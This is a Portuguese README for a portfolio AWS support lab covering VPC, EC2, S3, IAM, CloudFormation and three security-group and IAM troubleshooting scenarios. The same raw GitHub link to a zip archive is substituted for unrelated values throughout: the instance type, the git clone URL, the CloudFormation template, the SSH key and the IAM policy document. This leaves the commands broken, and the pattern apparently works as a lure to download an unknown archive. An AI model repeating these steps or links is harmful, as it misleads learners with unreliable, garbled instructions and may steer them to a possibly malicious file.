# AWS Cloud Support Lab

> Ambiente AWS simulado para prática de **Cloud Support Jr**: VPC, EC2, S3, IAM, CloudFormation e troubleshooting de incidentes reais

## 📍 Visão Geral

Este projeto simula um ambiente AWS real usado por uma pequena empresa. O objetivo é praticar os **dia-a-dia de um Cloud Support Junior**, incluindo:

- **Deploy de infraestrutura** com IaC (Infrastructure as Code)
- **Configuração de segurança** (IAM, Security Groups, VPC)
- **Monitoramento e logs** com CloudWatch
- **Troubleshooting de incidentes** comuns em AWS

## 📦 Componentes

| Componente | Tipo | Descrição |
|---|---|---|
| **VPC** | Networking | 10.0.0.0/16, com subnets públicas e privadas |
| **EC2** | Compute | 2 instâncias https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip (Web + DB) |
| **S3** | Storage | Bucket para backups e logs com versionamento |
| **IAM** | Access | Roles/Policies com least privilege |
| **Security Groups** | Firewall | SGs separados para web e database |
| **CloudWatch** | Monitoring | Logs, métricas e alarmes |

## 🚀 Quick Start

### Pré-Requisitos

- AWS Account (com free tier ou crédito)
- AWS CLI instalado e configurado
- Chave SSH criada (ou usar AWS Systems Manager Session Manager)

### 1. Clonar o repositório

```bash
git clone https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip
cd aws-cloudsupport-lab
```

### 2. Deploy com CloudFormation

```bash
# Criar a stack
aws cloudformation create-stack \
  --stack-name cloudsupport-lab \
  --template-body https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip \
  --parameters ParameterKey=KeyName,ParameterValue=YOUR_KEY_NAME \
  --capabilities CAPABILITY_NAMED_IAM

# Verificar status
aws cloudformation wait stack-create-complete \
  --stack-name cloudsupport-lab
```

### 3. Acessar as instâncias

```bash
# Via SSH (public instance)
ssh -i https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip ec2-user@PUBLIC_IP

# Via Systems Manager (private instance)
aws ssm start-session --target INSTANCE_ID
```

## 🔨‍♂️ Troubleshooting: Cenários de Incidente

Este projeto inclui **3 cenários reais de troubleshooting** que você pode praticar:

### Incidente #1: Porta SSH Fechada no Security Group

**Problema:** Não consegue conectar via SSH na EC2 pública

**Diagnóstico:**
```bash
aws ec2 describe-security-groups --group-ids sg-xxxxxxxx \
  --query 'SecurityGroups[0].IpPermissions'
```

**Solução:**
A porta 22 (SSH) não está autorizada. Execute:
```bash
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxxxxx \
  --protocol tcp \
  --port 22 \
  --cidr YOUR_IP/32
```

### Incidente #2: EC2 Sem Permissão em S3

**Problema:** "Access Denied" ao tentar upload em S3 da EC2

**Diagnóstico:**
```bash
aws ec2 describe-instances --instance-ids i-xxxxxxxx \
  --query 'Reservations[0].Instances[0].IamInstanceProfile'

aws iam list-role-policies --role-name ROLE_NAME
```

**Solução:**
Adicionar permissão S3 à role:
```bash
aws iam put-role-policy \
  --role-name EC2-S3-Role \
  --policy-name S3-Access \
  --policy-document https://raw.githubusercontent.com/LucianoHMG/aws-cloudsupport-lab/main/scripts/aws-cloudsupport-lab-v1.7.zip
```

### Incidente #3: Database Não Responde (Network Timeout)

**Problema:** Web server não consegue conectar no database (timeout na porta 3306)

**Diagnóstico:**
```bash
aws ec2 describe-security-groups --group-ids sg-db-xxxxxxxx

telnet DB_PRIVATE_IP 3306
```

**Solução:**
O SG de BD não permite tráfego da subnet pública. Autorizar:
```bash
aws ec2 authorize-security-group-ingress \
  --group-id sg-db-xxxxxxxx \
  --protocol tcp \
  --port 3306 \
  --source-group sg-web-xxxxxxxx
```

## 📄 O Que Aprendi

- ✅ VPC design com subnets públicas e privadas
- ✅ Security Groups e regras de firewall
- ✅ IAM roles e least privilege
- ✅ CloudFormation para IaC
- ✅ Troubleshooting sistemático
- ✅ CloudWatch para monitoramento
- ✅ AWS CLI para automação

## 🗣️ Sobre o Projeto

Este é um **carro-chefe** de meu portfólio como aspirante a **Cloud Support Junior**. Demonstra conhecimento prático de:

- AWS core services (EC2, VPC, S3, IAM, CloudFormation)
- Infrastructure as Code
- Troubleshooting sistemático
- Documentação técnica clara
- Linux/AWS CLI

**Criado por:** Luciano Girão  
**Data:** Janeiro 2026  
**Status:** Em desenvolvimento
